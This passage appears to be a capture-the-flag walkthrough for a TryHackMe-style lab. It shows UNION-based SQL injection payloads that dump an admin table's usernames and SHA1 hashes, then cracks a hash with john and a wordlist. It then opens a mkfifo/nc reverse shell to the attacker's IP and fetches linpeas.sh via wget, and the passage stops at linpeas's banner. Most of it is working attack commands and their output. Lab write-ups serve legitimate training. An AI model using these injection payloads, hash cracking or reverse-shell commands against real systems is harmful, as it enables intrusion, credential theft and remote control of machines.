2 	3 	host_summary_by_file_io
2 	3 	host_summary_by_file_io_type
2 	3 	host_summary_by_stages
2 	3 	host_summary_by_statement_latency
2 	3 	host_summary_by_statement_type
2 	3 	innodb_buffer_stats_by_schema
2 	3 	innodb_buffer_stats_by_table
2 	3 	io_by_thread_by_latency
2 	3 	io_global_by_file_by_bytes
2 	3 	io_global_by_file_by_latency
2 	3 	io_global_by_wait_by_bytes
2 	3 	io_global_by_wait_by_latency
2 	3 	latest_file_io
2 	3 	memory_by_host_by_current_bytes
2 	3 	memory_by_thread_by_current_bytes
2 	3 	memory_by_user_by_current_bytes
2 	3 	memory_global_by_current_bytes
2 	3 	memory_global_total
2 	3 	metrics
2 	3 	ps_check_lost_instrumentation
2 	3 	schema_auto_increment_columns
2 	3 	schema_index_statistics
2 	3 	schema_object_overview
2 	3 	schema_redundant_indexes
2 	3 	schema_table_lock_waits
2 	3 	schema_table_statistics
2 	3 	schema_table_statistics_with_buffer
2 	3 	schema_tables_with_full_table_scans
2 	3 	schema_unused_indexes
2 	3 	session
2 	3 	session_ssl_status
2 	3 	statement_analysis
2 	3 	statements_with_errors_or_warnings
2 	3 	statements_with_full_table_scans
2 	3 	statements_with_runtimes_in_95th_percentile
2 	3 	statements_with_sorting
2 	3 	statements_with_temp_tables
2 	3 	sys_config
2 	3 	user_summary
2 	3 	user_summary_by_file_io
2 	3 	user_summary_by_file_io_type
2 	3 	user_summary_by_stages
2 	3 	user_summary_by_statement_latency
2 	3 	user_summary_by_statement_type
2 	3 	version
2 	3 	wait_classes_global_by_avg_latency
2 	3 	wait_classes_global_by_latency
2 	3 	waits_by_host_by_latency
2 	3 	waits_by_user_by_latency
2 	3 	waits_global_by_latency
2 	3 	x$host_summary
2 	3 	x$host_summary_by_file_io
2 	3 	x$host_summary_by_file_io_type
2 	3 	x$host_summary_by_stages
2 	3 	x$host_summary_by_statement_latency
2 	3 	x$host_summary_by_statement_type
2 	3 	x$innodb_buffer_stats_by_schema
2 	3 	x$innodb_buffer_stats_by_table
2 	3 	x$innodb_lock_waits
2 	3 	x$io_by_thread_by_latency
2 	3 	x$io_global_by_file_by_bytes
2 	3 	x$io_global_by_file_by_latency
2 	3 	x$io_global_by_wait_by_bytes
2 	3 	x$io_global_by_wait_by_latency
2 	3 	x$latest_file_io
2 	3 	x$memory_by_host_by_current_bytes
2 	3 	x$memory_by_thread_by_current_bytes
2 	3 	x$memory_by_user_by_current_bytes
2 	3 	x$memory_global_by_current_bytes
2 	3 	x$memory_global_total
2 	3 	x$processlist
2 	3 	x$ps_digest_95th_percentile_by_avg_us
2 	3 	x$ps_digest_avg_latency_distribution
2 	3 	x$ps_schema_table_statistics_io
2 	3 	x$schema_flattened_keys
2 	3 	x$schema_index_statistics
2 	3 	x$schema_table_lock_waits
2 	3 	x$schema_table_statistics
2 	3 	x$schema_table_statistics_with_buffer
2 	3 	x$schema_tables_with_full_table_scans
2 	3 	x$session
2 	3 	x$statement_analysis
2 	3 	x$statements_with_errors_or_warnings
2 	3 	x$statements_with_full_table_scans
2 	3 	x$statements_with_runtimes_in_95th_percentile
2 	3 	x$statements_with_sorting
2 	3 	x$statements_with_temp_tables
2 	3 	x$user_summary
2 	3 	x$user_summary_by_file_io
2 	3 	x$user_summary_by_file_io_type
2 	3 	x$user_summary_by_stages
2 	3 	x$user_summary_by_statement_latency
2 	3 	x$user_summary_by_statement_type
2 	3 	x$wait_classes_global_by_avg_latency
2 	3 	x$wait_classes_global_by_latency
2 	3 	x$waits_by_host_by_latency
2 	3 	x$waits_by_user_by_latency
2 	3 	x$waits_global_by_latency
2 	3 	admin
2 	3 	stock

and here we can see admin and stock

asdaad' union select 1,2,3,table_name from information_schema.tables where table_schema = 'webapp' # 

Item 	Amount 	Cost
2 	3 	admin
2 	3 	stock

now getting columns

adada' union select 1,2,3,column_name from information_schema.columns where table_name='admin' # 

Item 	Amount 	Cost
2 	3 	id
2 	3 	user
2 	3 	hash

let's get user and hash (pass)

adad' union select 1,2,user,hash from admin # 

or

adad' union select 1,2,user,hash from webapp.admin #

Item 	Amount 	Cost
2 	xXUltimateCreeperXx 	88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
2 	web_flag 	THM{bbe315906038c3a62d9b195001f75008}

another way

adad' union select 1,2,3,group_concat(user,0x3a,hash) from webapp.admin # 

Item 	Amount 	Cost
2 	3 	xXUltimateCreeperXx:88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01,web_flag:THM{bbe315906038c3a62d9b195001f75008}

now we have admin creds

xXUltimateCreeperXx: 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01

using crackstation or john

┌──(witty㉿kali)-[/tmp]
└─$ echo '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01' > hash
                                                                                   
┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
diamond123456789 (?)     
1g 0:00:00:01 DONE () 0.6711g/s 5797Kp/s 5797Kc/s 5797KC/s diamond125..diamond123123
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.

Hash
88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
Type
sha1
Result
diamond123456789

so xXUltimateCreeperXx:diamond123456789

go to subdomain admin

after login we can run commands

env

APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20551
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=f9beef5962db4caaa17757d55313b392
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/admin

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.88.215] 43288
bash: cannot set terminal process group (1136): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cybercrafted:/var/www/admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cybercrafted:/var/www/admin$ ls -lah /
ls -lah /
total 2.1G
drwxr-xr-x  24 root root 4.0K Sep 30  2021 .
drwxr-xr-x  24 root root 4.0K Sep 30  2021 ..
drwxr-xr-x   2 root root 4.0K Sep 12  2021 bin
drwxr-xr-x   4 root root 4.0K Oct  4  2021 boot
drwxr-xr-x   2 root root 4.0K Jun 26  2021 cdrom
drwxr-xr-x  18 root root 3.7K Mar  8 16:27 dev
drwxr-xr-x 102 root root 4.0K Oct 15  2021 etc
drwxr-xr-x   4 root root 4.0K Jun 27  2021 home
lrwxrwxrwx   1 root root   34 Sep 30  2021 initrd.img -> boot/initrd.img-4.15.0-159-generic
lrwxrwxrwx   1 root root   34 Sep 30  2021 initrd.img.old -> boot/initrd.img-4.15.0-156-generic
drwxr-xr-x  22 root root 4.0K Jun 27  2021 lib
drwxr-xr-x   2 root root 4.0K Jun 26  2021 lib64
drwx------   2 root root  16K Jun 26  2021 lost+found
drwxr-xr-x   2 root root 4.0K Aug  6  2020 media
drwxr-xr-x   2 root root 4.0K Aug  6  2020 mnt
drwxr-xr-x   3 root root 4.0K Jun 27  2021 opt
dr-xr-xr-x 115 root root    0 Mar  8 16:27 proc
drwx------   6 root root 4.0K Oct 15  2021 root
drwxr-xr-x  27 root root  880 Mar  8 16:28 run
drwxr-xr-x   2 root root  12K Sep 12  2021 sbin
drwxr-xr-x   2 root root 4.0K Jun 26  2021 snap
drwxr-xr-x   2 root root 4.0K Aug  6  2020 srv
-rw-------   1 root root 2.0G Jun 26  2021 swap.img
dr-xr-xr-x  13 root root    0 Mar  8 16:27 sys
drwxrwxrwt   2 root root 4.0K Mar  8 18:48 tmp
drwxr-xr-x  11 root root 4.0K Jun 26  2021 usr
drwxr-xr-x  14 root root 4.0K Jun 26  2021 var
lrwxrwxrwx   1 root root   31 Sep 30  2021 vmlinuz -> boot/vmlinuz-4.15.0-159-generic
lrwxrwxrwx   1 root root   31 Sep 30  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-156-generic

let's upload linpeas.sh

www-data@cybercrafted:/tmp$ ls
ls
f
www-data@cybercrafted:/tmp$ file f
file f
f: fifo (named pipe)

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.88.215 - - [08/Mar/2023 13:59:16] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@cybercrafted:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.69K   601KB/s    in 1.3s    

(601 KB/s) - 'linpeas.sh' saved [828098/828098]

www-data@cybercrafted:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@cybercrafted:/tmp$ ./linpeas.sh

www-data@cybercrafted:/tmp$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
